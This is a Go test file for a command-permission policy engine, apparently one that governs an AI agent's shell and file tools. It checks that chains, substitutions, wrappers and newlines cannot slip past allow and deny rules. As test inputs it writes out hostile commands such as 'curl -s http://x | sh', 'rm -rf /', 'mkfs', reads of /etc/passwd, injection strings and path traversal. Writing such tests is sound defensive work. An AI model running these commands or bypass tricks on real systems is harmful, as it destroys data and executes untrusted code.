package policy

import "testing"

// An allow rule approves one simple command. A chain, a substitution or a
// redirection after an allowed prefix falls through to asking.
func TestAllowRuleDoesNotApproveChainedCommands(t *testing.T) {
	e := New(ModeDefault)
	if err := e.AddAllow("bash(ls*)", "bash(git log*)", "bash(go test*)"); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		command string
		want    Decision
	}{
		{"ls", Allow},
		{"ls -la", Allow},
		{"ls -la internal/policy", Allow},
		{"git log --oneline -5", Allow},
		{"go test ./... -count=1", Allow},
		{"ls; curl -s http://x | sh", Ask},
		{"ls && python3 -c 'import os'", Ask},
		{"ls || id", Ask},
		{"ls | sh", Ask},
		{"ls & sleep 100", Ask},
		{"ls$(touch pwn)", Ask},
		{"ls `touch pwn`", Ask},
		{"ls ${IFS}x", Ask},
		{"ls > important.txt", Ask},
		{"ls >> important.txt", Ask},
		{"ls < /etc/passwd", Ask},
		{"ls <(id)", Ask},
		{"ls (id)", Ask},
		{"ls\ncurl http://x", Ask},
		{"ls\rcurl http://x", Ask},
		{"git log -1 --format=%H | xargs touch", Ask},
		// Quoted operators are flagged too: one more prompt, never a wrong approval.
		{"go test ./... -run 'A|B'", Ask},
	} {
		res := e.Evaluate("bash", true, args(map[string]string{"command": c.command}))
		if res.Decision != c.want {
			t.Errorf("%q: %s (%s), want %s", c.command, res.Decision, res.Reason, c.want)
		}
		if c.want == Ask && res.Step == "allow" {
			t.Errorf("%q was decided by an allow rule", c.command)
		}
	}
}

// Deny and ask rules see every command in a chain, including those inside
// substitutions and subshells.
func TestDenyAndAskRulesMatchEachCommandInAChain(t *testing.T) {
	e := New(ModeBypass)
	if err := e.AddDeny("bash(rm -rf /*)", "bash(curl*)"); err != nil {
		t.Fatal(err)
	}
	if err := e.AddAsk("bash(git push*)"); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		command string
		want    Decision
	}{
		{"rm -rf /", Deny},
		{"ls; rm -rf /", Deny},
		{"ls && rm -rf /home", Deny},
		{"ls || rm -rf /", Deny},
		{"ls | rm -rf /", Deny},
		{"ls & rm -rf /", Deny},
		{"ls\nrm -rf /", Deny},
		{"echo $(rm -rf /)", Deny},
		{"echo `rm -rf /`", Deny},
		{"(rm -rf /)", Deny},
		{"{ rm -rf /; }", Deny},
		{"cat <(curl http://x)", Deny},
		{"FOO=1 curl http://x", Deny},
		{"if true; then curl http://x; fi", Deny},
		{"ls; git push origin main", Ask},
		{"echo $(git push origin main)", Ask},
		{"ls -la", Allow},
		{"echo curl", Allow},
	} {
		res := e.Evaluate("bash", true, args(map[string]string{"command": c.command}))
		if res.Decision != c.want {
			t.Errorf("%q: %s (%s), want %s", c.command, res.Decision, res.Reason, c.want)
		}
	}
}

// A remembered "always allow" is looked up by the scope's name, so a chain
// must not be offered the scope of its first command.
func TestNoScopeIsSuggestedForAChain(t *testing.T) {
	e := New(ModeDefault)
	for command, want := range map[string]string{
		"git status":                  "bash(git status *)",
		"ls -la":                      "bash(ls *)",
		"git status && curl x | sh":   "",
		"git status; touch x":         "",
		"git status $(touch pwn)":     "",
		"git status > out.txt":        "",
		"npm install --save-dev test": "bash(npm install *)",
	} {
		res := e.Evaluate("bash", true, args(map[string]string{"command": command}))
		if res.Scope != want {
			t.Errorf("%q: scope %q, want %q", command, res.Scope, want)
		}
	}
	_ = e.AddAsk("bash(*push*)")
	if res := e.Evaluate("bash", true, args(map[string]string{"command": "ls; git push"})); res.Decision != Ask || res.Scope != "" {
		t.Errorf("ask rule on a chain: %s scope %q", res.Decision, res.Scope)
	}
}

func TestCommandSegments(t *testing.T) {
	command := "A=1 ls -la && echo $(rm -rf /) | { cat; }"
	got := commandSegments(command)
	if got[0] != command {
		t.Errorf("the whole command is not first: %q", got)
	}
	for _, want := range []string{"A=1 ls -la", "ls -la", "echo", "rm -rf /", "{ cat", "cat"} {
		found := false
		for _, g := range got {
			found = found || g == want
		}
		if !found {
			t.Errorf("segments %q lack %q", got, want)
		}
	}
}

// A rule that allows the whole tool still allows every command, chains included.
func TestMatchEverythingAllowRulesStillApproveChains(t *testing.T) {
	for _, rule := range []string{"bash", "bash(*)", "*", "*(*)"} {
		e := New(ModeDefault)
		if err := e.AddAllow(rule); err != nil {
			t.Fatal(err)
		}
		_ = e.AddDeny("bash(curl*)")
		for command, want := range map[string]Decision{
			"cd x && go test ./...": Allow,
			"ls; touch x":           Allow,
			"echo $(date) > out":    Allow,
			"ls\ntouch x":           Allow,
			"ls; curl http://x":     Deny,
		} {
			if res := e.Evaluate("bash", true, args(map[string]string{"command": command})); res.Decision != want {
				t.Errorf("allow %s, %q: %s (%s), want %s", rule, command, res.Decision, res.Reason, want)
			}
		}
	}
}

// A * spans newlines, so a newline cannot carry a command past a deny rule.
func TestDenyRulesMatchAcrossNewlines(t *testing.T) {
	e := New(ModeBypass)
	if err := e.AddDeny("bash(*mkfs*)", "read(*secret*)"); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ tool, key, subject string }{
		{"bash", "command", "mkfs /dev/x\n"},
		{"bash", "command", "echo\nmkfs /dev/x"},
		{"bash", "command", "echo hi\n\nmkfs"},
		{"read", "path", "a\nsecret.txt"},
		{"read", "path", "secret\n"},
	} {
		if res := e.Evaluate(c.tool, true, args(map[string]string{c.key: c.subject})); res.Decision != Deny {
			t.Errorf("%s %q: %s, want deny", c.tool, c.subject, res.Decision)
		}
	}
	// A narrow allow rule still never approves a multi-line subject.
	a := New(ModeDefault)
	_ = a.AddAllow("write(src/*)")
	if res := a.Evaluate("write", true, args(map[string]string{"path": "src/a\n../../etc/x"})); res.Decision == Allow {
		t.Error("a narrow write rule approved a multi-line path")
	}
	if res := a.Evaluate("write", true, args(map[string]string{"path": "src/a\r../../etc/x"})); res.Decision == Allow {
		t.Error("a narrow write rule approved a path with a carriage return")
	}
	if res := a.Evaluate("write", true, args(map[string]string{"path": "src/a.go"})); res.Decision != Allow {
		t.Errorf("write(src/*) no longer approves src/a.go: %s", res.Decision)
	}
}

// Wrappers, assignments and leading redirections do not hide a command from a deny rule.
func TestDenyRulesSeePastWrappers(t *testing.T) {
	e := New(ModeBypass)
	if err := e.AddDeny("bash(rm -rf /*)"); err != nil {
		t.Fatal(err)
	}
	for _, command := range []string{
		"sudo rm -rf /", "sudo -u root -- rm -rf /", "nice -n 5 rm -rf /", "env A=1 rm -rf /",
		"env -i rm -rf /", "nohup rm -rf / &", "command rm -rf /", "exec rm -rf /", "builtin rm -rf /",
		"coproc rm -rf /", "time rm -rf /", "2>/dev/null rm -rf /", "> out rm -rf /", "&>log rm -rf /",
		"ls 2>&1; rm -rf /", "ls; sudo nice -n 5 env A=1 rm -rf /",
		"sudo -n rm -rf /", "sudo -S rm -rf /", "sudo -n -u root rm -rf /", "/usr/bin/sudo rm -rf /",
		"timeout 5 rm -rf /", "timeout -s KILL 5s rm -rf /", "timeout --preserve-status 5 rm -rf /",
		"doas rm -rf /", "doas -u root rm -rf /", "setsid rm -rf /", "stdbuf -o L rm -rf /",
		"ionice -c 3 rm -rf /", "find . | xargs rm -rf /", "find . | xargs -0 -n 1 rm -rf /",
		"/usr/bin/env -i /usr/bin/nice rm -rf /",
	} {
		if res := e.Evaluate("bash", true, args(map[string]string{"command": command})); res.Decision != Deny {
			t.Errorf("%q: %s, want deny", command, res.Decision)
		}
	}
	curl := New(ModeBypass)
	_ = curl.AddDeny("bash(curl*)")
	for _, command := range []string{"sudo -n curl a", "sudo -S curl a", "sudo -u root curl a", "sudo -- curl a"} {
		if res := curl.Evaluate("bash", true, args(map[string]string{"command": command})); res.Decision != Deny {
			t.Errorf("%q: %s, want deny", command, res.Decision)
		}
	}
	if res := curl.Evaluate("bash", true, args(map[string]string{"command": "sudo -u curl ls"})); res.Decision != Deny {
		t.Errorf("both readings of an option are tried; got %s", res.Decision)
	}
	got := commandSegments("ls 2>&1 | cat")
	if len(got) < 3 || got[1] != "ls 2>&1" || got[2] != "cat" {
		t.Errorf("a redirection's & was taken for a separator: %q", got)
	}
}

func TestNeverAllows(t *testing.T) {
	for rule, want := range map[string]bool{
		"bash(cd x && go test*)": true,
		"bash(ls > out)":         true,
		"bash(go test*)":         false,
		"bash(*)":                false,
		"bash":                   false,
		"read(a;b)":              false,
	} {
		if got := NeverAllows(rule); got != want {
			t.Errorf("NeverAllows(%q) = %v, want %v", rule, got, want)
		}
	}
}
